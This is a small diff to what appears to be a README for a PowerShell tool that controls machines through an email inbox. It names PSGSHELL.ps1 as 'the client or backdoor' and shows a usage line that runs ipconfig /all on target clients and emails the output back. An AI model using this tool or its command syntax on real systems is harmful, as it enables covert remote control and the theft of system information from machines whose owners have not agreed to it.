@@ -39,3 +39,5 @@ The '~' is the delimiter between the powershell command at the front of the subj
 .\commander.ps1 '$var = ipconfig /all; sendemail $var ~123434:343454:32233'
 
 Currently the script accepts a single input that is the PS ONELINER, an optional sendmail, followed by the '~' and then $client_names which there can be multiple but should be seperated by colons.
+PSGSHELL.ps1 is the client or backdoor
+commander.ps1 is a script that sends the commands to the inbox (very simple)
